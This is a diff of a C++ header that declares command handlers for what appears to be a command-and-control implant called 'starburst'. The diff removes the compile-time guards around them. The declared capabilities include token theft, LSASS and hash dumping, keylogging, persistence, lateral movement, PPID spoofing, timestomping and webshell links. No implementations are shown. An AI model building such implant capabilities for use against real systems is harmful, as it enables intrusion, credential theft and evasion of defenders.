@@ -13,375 +13,100 @@ namespace starburst {
         CmdHandler handler;
     };
 
-#ifdef INCLUDE_CMD_EXIT
     auto declfn cmd_exit( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SLEEP
     auto declfn cmd_sleep( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SHELL
     auto declfn cmd_shell( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_WHOAMI
     auto declfn cmd_whoami( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PWD
     auto declfn cmd_pwd( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CD
     auto declfn cmd_cd( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LS
     auto declfn cmd_ls( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PS
     auto declfn cmd_ps( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CONFIG
     auto declfn cmd_config( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_UPLOAD
     auto declfn cmd_upload( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_DOWNLOAD
     auto declfn cmd_download( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SHINJECT
     auto declfn cmd_shinject( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_EXECUTE_PIC
     auto declfn cmd_execute_pic( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CAT
     auto declfn cmd_cat( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_MKDIR
     auto declfn cmd_mkdir( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_RM
     auto declfn cmd_rm( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CP
     auto declfn cmd_cp( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_MV
     auto declfn cmd_mv( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_ENV
     auto declfn cmd_env( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_REG_QUERY
     auto declfn cmd_reg_query( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SCREENSHOT
     auto declfn cmd_screenshot( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_TOKEN_LIST
     auto declfn cmd_token_list( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
     auto declfn cmd_execute_assembly( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_EXECUTE_COFF
     auto declfn cmd_execute_coff( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_JUMP_PSEXEC
     auto declfn cmd_jump_psexec( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_JUMP_SCSHELL
     auto declfn cmd_jump_scshell( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_JUMP_WMIEXEC
     auto declfn cmd_jump_wmiexec( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_JUMP_DCOMEXEC
     auto declfn cmd_jump_dcomexec( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_IFCONFIG
     auto declfn cmd_ifconfig( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NETSTAT
     auto declfn cmd_netstat( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_KILL
     auto declfn cmd_kill( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_RUN
     auto declfn cmd_run( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_GETPRIVS
     auto declfn cmd_getprivs( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LISTPIPES
     auto declfn cmd_listpipes( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_REG_WRITE_VALUE
     auto declfn cmd_reg_write_value( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_MAKE_TOKEN
     auto declfn cmd_make_token( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_STEAL_TOKEN
     auto declfn cmd_steal_token( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_REV2SELF
     auto declfn cmd_rev2self( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NET_LOCALGROUP
     auto declfn cmd_net_localgroup( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NET_LOCALGROUP_MEMBER
     auto declfn cmd_net_localgroup_member( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_JOBKILL
     auto declfn cmd_jobkill( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LINK
     auto declfn cmd_link( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_UNLINK
     auto declfn cmd_unlink( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#if defined(INCLUDE_CMD_DOWNLOAD) || defined(INCLUDE_CMD_SCREENSHOT)
     auto declfn cmd_download_resp( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SOCKS
     auto declfn cmd_socks( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SSH
     auto declfn cmd_ssh( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_RPFWD
     auto declfn cmd_rpfwd( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_MIGRATE
     auto declfn cmd_migrate( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_BLOCKDLLS
     auto declfn cmd_blockdlls( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_KEYLOG
     auto declfn cmd_keylog( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_ENUMDESKTOPS
     auto declfn cmd_enumdesktops( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_TIMESTOMP
     auto declfn cmd_timestomp( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LOCALTIME
     auto declfn cmd_localtime( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_IDLETIME
     auto declfn cmd_idletime( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_GETUID
     auto declfn cmd_getuid( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_BROWSERPIVOT
     auto declfn cmd_browserpivot( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CONNECT
     auto declfn cmd_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_DISCONNECT
     auto declfn cmd_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_POWERPICK
     auto declfn cmd_powerpick( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SPAWNTO_X64
     auto declfn cmd_spawnto_x64( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SPAWNTO_X86
     auto declfn cmd_spawnto_x86( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_SPAWN
     auto declfn cmd_spawn( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_ARP
     auto declfn cmd_arp( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_DRIVES
     auto declfn cmd_drives( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_UPTIME
     auto declfn cmd_uptime( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NET_SESSIONS
     auto declfn cmd_net_sessions( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NET_SHARES
     auto declfn cmd_net_shares( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_NET_LOGGEDON
     auto declfn cmd_net_loggedon( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_CLIPBOARD
     auto declfn cmd_clipboard( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_WINDOWS
     auto declfn cmd_windows( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_REG_DELETE
     auto declfn cmd_reg_delete( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_REG_CREATE_KEY
     auto declfn cmd_reg_create_key( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PERSIST_RUN
     auto declfn cmd_persist_run( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PERSIST_SCHTASK
     auto declfn cmd_persist_schtask( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PERSIST_SERVICE
     auto declfn cmd_persist_service( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PPID_SPOOF
     auto declfn cmd_ppid_spoof( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_ARGUE
     auto declfn cmd_argue( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_RUNAS
     auto declfn cmd_runas( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_HASHDUMP
     auto declfn cmd_hashdump( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LSASS_DUMP
     auto declfn cmd_lsass_dump( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_TOKEN_STORE
     auto declfn cmd_token_store( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_PORTSCAN
     auto declfn cmd_portscan( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_INLINE_EXECUTE
     auto declfn cmd_inline_execute( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LOAD
     auto declfn cmd_load( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_WMIEXEC
     auto declfn cmd_wmiexec( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_DCOMEXEC
     auto declfn cmd_dcomexec( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_EXECUTE_BOFPE
     auto declfn cmd_execute_bofpe( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LLDP_CONNECT
     auto declfn cmd_lldp_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LLDP_DISCONNECT
     auto declfn cmd_lldp_disconnect( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_LINK_WEBSHELL
     auto declfn cmd_link_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#ifdef INCLUDE_CMD_UNLINK_WEBSHELL
     auto declfn cmd_unlink_webshell( instance& inst, char* task_uuid, Parser* params ) -> void;
-#endif
-
-#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
     auto declfn ws_poll_links( instance& inst ) -> void;
     auto declfn ws_link_send_msg( instance& inst, instance::WebshellLink* link,
                                    uint8_t* data, uint32_t len ) -> bool;
-#endif
 
 }
 
